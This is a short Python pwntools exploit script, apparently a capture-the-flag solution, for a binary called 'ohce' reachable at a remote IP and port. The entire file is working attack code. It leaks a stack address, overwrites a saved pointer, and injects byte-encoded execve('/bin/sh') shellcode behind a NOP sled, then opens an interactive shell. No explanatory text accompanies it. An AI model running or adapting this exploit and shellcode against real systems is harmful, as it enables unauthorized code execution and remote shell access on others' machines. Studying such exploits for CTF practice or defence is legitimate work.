from pwn import *

if len(sys.argv) > 1:
	r = remote('13.124.134.94', 8888)
else:
	r = process('./ohce')

shell = '\x90'*21 + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + '\x90'*9

print r.recvuntil('> ')
r.sendline('1')

r.sendline('a'*31)

p = r.recvuntil('> ')
print p

ebp_leak = u64(p[33:39] + '\x00\x00')
print 'ebp leak: ' + hex(ebp_leak)

r.sendline('1')
r.sendline('a'*8 + p64(ebp_leak-72) + 'a'*70)
print r.recvuntil('> ')

payload = (p64(ebp_leak-112)[::-1])[2:] + shell[::-1]

print '[+] payload: ' + payload

r.sendline('2')
raw_input()
r.sendline(payload)

print hexdump(r.recv(1024))

r.interactive()
